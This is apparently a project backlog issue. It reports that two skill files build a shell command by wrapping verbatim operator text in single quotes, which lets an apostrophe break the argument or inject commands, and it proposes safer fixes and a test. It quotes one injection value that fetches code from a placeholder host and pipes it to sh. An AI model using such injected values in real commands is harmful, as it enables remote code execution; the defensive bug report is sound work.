---
kind: story
size: 3
parent: "3016"
status: open
scope: ["we:skills-src/capture-learning/SKILL.md", "we:skills-src/closing-session/SKILL.md"]
dateOpened: "2026-09-14"
tags: []
---

# capture-learning/closing-session: single-quoted verbatim operator text breaks the shell command on an apostrophe (PR #2225 review)

Independent jury review of PR #2225 (still OPEN as of filing, verdict: changes requested) found a real shell-injection/breakage defect in the delivery for #3016. we:skills-src/capture-learning/SKILL.md and we:skills-src/closing-session/SKILL.md both instruct building a we:scripts/conveyor/learnings-drop.mjs shell invocation with --quoted-turn='<the operator turn, verbatim>' — wrapping UNCAPPED, verbatim operator/transcript text in single quotes with no escaping. Single quotes have no in-string escape mechanism in bash, so any quoted turn containing an ordinary apostrophe (e.g. "don't re-run the whole suite", "that's wasteful") closes the quoted argument early; the remainder is re-parsed as shell syntax — at minimum a broken invocation, and with adversarial transcript/operator text (e.g. containing "'; curl evil | sh #") this is arbitrary command execution in the agent's own shell. Confirmed independently by two review lenses on PR #2225: security (we:skills-src/capture-learning/SKILL.md:57, we:skills-src/closing-session/SKILL.md:146, both [PLAUSIBLE], impact if unfixed: broken) and codex-correctness (we:skills-src/capture-learning/SKILL.md:63, [CONFIRMED], impact if unfixed: degraded) — both marked 'OWED — file it', neither fixed in the PR. Fix direction (suggested by both lenses, not mandated): never rely on inline single-quote shell interpolation for freeform/verbatim external text — route it through a mechanism the shell does not re-parse (a temp file referenced by path, --stdin JSON, or an argv-array subprocess call), ideally fixed once in a shared snippet both we:skills-src SKILL files reference so the two copies cannot drift or repeat the bug independently. Add a deterministic test/check covering apostrophes, backticks, and command substitutions in the quoted-turn value. Parented under #3016 (the story whose delivery PR, #2225, introduces this exact guidance into both files) since #3016 is itself broader (deletes the recurrence admission gate) and not specifically about shell quoting — checked we:backlog/ for prior coverage of this shape before filing (nothing found: searched shell-injection/single-quote/shell-quoting against these two skill files) so this is fresh, not a duplicate. Do not confuse with we:backlog/3388 (we:scripts/verify-lane.mjs's own unrelated ShellQuote gap) or we:backlog/2980 (backlog CLI argument command-substitution denial) — different call sites, different files.

## Done when

1. **Executable** — TODO: a command that fails before this item lands and passes after.
